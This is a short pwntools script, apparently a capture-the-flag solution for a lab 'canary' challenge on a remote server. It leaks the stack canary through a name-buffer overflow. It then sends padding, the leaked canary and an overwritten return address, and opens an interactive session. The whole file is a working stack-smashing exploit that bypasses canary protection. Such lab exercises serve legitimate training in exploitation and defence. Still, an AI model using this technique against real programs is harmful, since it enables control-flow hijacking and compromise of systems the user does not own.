from pwn import *

# r = process('/media/sf_D_DRIVE/canary/canary')
r = remote('lab.scist.org', 33306)
print(r.recvuntil(b'name?').decode())
r.sendline(b'A' * (0x110 - 0x8))
print(r.recvline())
canary = r.recv(7)
print(canary)
print(len(canary))
print(r.recvuntil(b'length?').decode()) 
r.sendline(str(0x120).encode())
r.send((b'A') * 0x108 + (b'\x00') + canary + (b'A') * 8 + p64(0x004011FE))
# r.sendline(b'A' * 5)
# print(r.recvuntil(b'bye!').decode())

r.interactive()
